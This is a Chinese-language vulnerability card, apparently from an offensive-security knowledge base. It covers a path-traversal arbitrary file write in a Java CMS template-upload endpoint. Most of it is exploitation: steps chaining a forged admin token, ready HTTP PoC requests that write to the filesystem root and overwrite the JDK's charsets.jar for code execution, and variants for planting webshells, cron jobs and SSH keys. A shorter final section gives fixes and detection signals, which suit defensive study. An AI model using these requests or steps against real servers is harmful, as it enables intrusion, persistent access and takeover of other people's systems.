---
id: web-generic-file-upload-template-relative-path-original-filename-arbitrary-write
title: 模板上传 relativePath 与原始文件名直拼路径：任意目录、任意后缀文件写入
type: scenario
domain: web
path: web/generic/file-upload
technique: template-upload-relative-path-filename-path-traversal-write
aliases:
- TemplateController
- uploadFile
- relativePath
- TplLocalServiceImpl
- 模板上传穿越
- JEECMS X2.10
- 任意文件写入
tags:
- java
- spring
- file-upload
- path-traversal
- arbitrary-write
- template
- jeecms
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:46:54+08:00'
  notes: 已对照原文及截图18-22核对：TemplateController.upload 读取 relativePath 与 uploadFile 原始文件名，非 json 走后 tplService.uploadFile；TplLocalServiceImpl 用 tplPath+separator+originalFilename 直接 new File/createNewFile/写流，无 .. 规范化、无后缀白名单；实测 relativePath ../../.. + filename 111.aaa 成功，宿主 ls / 出现 111.aaa。版本 X2.10 为 demo 显示，已清除 affected_versions。未验证点：未复跑 PoC，未逐一验证 Windows 变体。
---

## 一句话结论

某 Java CMS 的模板上传接口 `POST /server-admin/template/uploadFile` 同时接收 `relativePath` 表单字段和 multipart 原始文件名，服务端把 `模板根 + relativePath + 分隔符 + originalFilename` 直接拼成 `File` 并写入，既不做 `..`/绝对路径规范化，也不限制后缀和内容；攻击者可借此把任意内容写到进程有权限的任意目录（示例写到文件系统根 `/111.aaa`），并进一步覆盖 JDK 的 `jre/lib/charsets.jar` 等文件实现 RCE。

## 原理

- **入口**：`TemplateController.upload` 接收 `MultipartFile[] uploadFile` 与 `@RequestParam("relativePath") String relativePath`；按原始文件名取后缀，非 `json` 时调用 `tplService.uploadFile(uploadFile, relativePath, siteId)`。
- **路径拼接**：`TplLocalServiceImpl.uploadFile` 先用 `tplPathMethod(relativePath, siteId, separator)` 得到模板路径，再 `stringBuffer.append(tplPath).append(separator).append(originalFilename)`，最后 `new File(stringBuffer.toString())`、`createNewFile()`、把上传流写入该文件。
- **缺少校验**：没有 `getCanonicalPath()`/`toRealPath()` 与模板根的前缀比较，没有拒绝 `..`、绝对路径、反斜杠，也没有后缀白名单；`relativePath` 和 `originalFilename` 都由客户端控制。
- **为什么能逃逸**：`File` 只做字符串拼接，`.`、`..` 在文件系统打开时才解析；`relativePath=../../../../...` 会把模板根逐级上溯到 `/`，随后拼接的文件名落在任意已存在目录。`createNewFile()` 不会创建父目录，所以目标目录必须已存在（系统目录、JDK 目录、Web 目录通常满足）。
- **任意内容**：上传流按字节原样写入，不校验图片魔数/后缀，可写 JAR、JSP、脚本、配置、计划任务、SSH `authorized_keys` 等。
- **权限**：Web 进程通常以 root 或应用账号运行；示例在 Linux 上把 `111.aaa` 写到了 `/`，说明进程对根目录可写。
- **与鉴权的关系**：接口位于 `/server-admin/**`，需要管理员令牌；本文场景中该令牌可由 Token 续期拦截器缺陷直接签发，二者组合成“未授权 → 管理员 → 任意文件写”。

## 触发条件

- 目标为该 CMS/同源代码，`/server-admin/template/uploadFile` 可达，调用者持有管理员令牌（或目标接口鉴权缺失）。
- 目标目录已存在且 Web 进程有写权限；`relativePath` 的 `../` 层数按模板根到目标目录的实际层级调整。
- 上传内容与文件名不受限制；目标路径不能是只读文件系统/容器只读层。
- 若服务端对 `relativePath` 做了规范化与前缀校验，或强制使用服务端生成的文件名，则本场景失效。

## 利用步骤

1. 获取管理员令牌（例如通过 Token 续期拦截器信任 `User-Id`/`User-Name` 头签发 admin JWT），或使用已有后台会话。
2. 先调用 `GET /server-admin/template/rightList?parentRelativePath=../../...` 确认目录可列、目标目录存在，并确定模板根到目标的层级。
3. 构造 multipart 请求：`relativePath` 填 `../../../../.../`，`uploadFile` 的 filename 填目标文件名（如 `111.aaa` 或 `charsets.jar`），内容为任意字节。
4. 发送后根据响应 `successfully:true` 与后续目录列表/文件访问确认落点。
5. 若要 RCE：把恶意 `charsets.jar` 写到 `$JAVA_HOME/jre/lib/` 覆盖原文件，再按字符集触发链执行命令（见关联卡）。
6. 也可写 Web 根脚本、cron、`authorized_keys`、应用配置等；按目标环境选择落点。

## PoC

```http
POST /server-admin/template/uploadFile HTTP/1.1
Host: target
Token: <admin JWT>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="relativePath"

../../../../../../../../../../../../
------X
Content-Disposition: form-data; name="uploadFile"; filename="111.aaa"
Content-Type: image/jpeg

111111
------X--
```

```text
# 目标 Linux 文件系统根出现 /111.aaa：
# ls / -> 111.aaa boot data etc ...
```

覆盖 JDK 字符集 JAR：

```http
POST /server-admin/template/uploadFile HTTP/1.1
Host: target
Token: <admin JWT>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="relativePath"

../../../../../../../../../../../usr/local/java/jdk1.8.0_261/jre/lib/
------X
Content-Disposition: form-data; name="uploadFile"; filename="charsets.jar"
Content-Type: image/jpeg

<恶意 charsets.jar 字节>
------X--
```

## 变体与关联

- **参数名变体**：`relativePath` 可能叫 `path`、`dir`、`parentRelativePath`、`savePath`；原始文件名可能来自 `getOriginalFilename()` 或单独的 `fileName` 字段。
- **文件名变体**：把 `../` 放进 `filename` 而不是 `relativePath`，或两者同时利用；Windows 下用 `..\`、盘符、UNC。
- **写入目标变体**：Web 根写 JSP/PHP；`WEB-INF/classes`、`lib` 写 class/jar；cron、systemd、`authorized_keys`；JDK `jre/lib/charsets.jar`、`jre/classes`。
- **关联**：[[web-generic-auth-token-renewal-trusted-user-headers-admin-jwt]]（前置鉴权绕过）、[[web-java-classloader-charsetprovider-spi-accept-rce]]（`jre/classes` SPI 注入）、[[web-java-classloader-charsets-jar-bootstrap-overwrite-accept-gbk-rce]]（覆盖 `jre/lib/charsets.jar`）、[[web-generic-file-upload-zip-slip-webshell-write]]（另一条任意写入路径）。
- **边界**：目标目录不存在、进程无写权限、只读容器、服务端规范化并校验前缀时失败。

## 检测与防御

- **修复**：对 `relativePath` 做 `Path.normalize()` 后用 `toRealPath()`/`getCanonicalPath()` 校验必须位于模板根内；拒绝绝对路径、`..`、反斜杠与符号链接。
- **修复**：不要使用客户端原始文件名；由服务端生成 UUID/哈希文件名，后缀从白名单映射；上传目录与 Web 根、JDK 目录分离。
- **加固**：Web 进程降权运行，模板目录最小写权限；文件完整性监控 JDK/系统目录；容器只读根文件系统。
- **检测**：`relativePath` 或 filename 含 `../`、`..\\`、绝对路径、盘符；上传后模板根之外出现新文件；`/`、`/tmp`、JDK 目录出现异常文件名；随后出现 `charsets.jar` 被替换、JVM 派生 `sh` 子进程等信号。
- **审计**：搜索 `getOriginalFilename()`、`relativePath`、`new File(`、`createNewFile()`、`FileOutputStream`，回溯是否与上传根做了 canonical 校验。
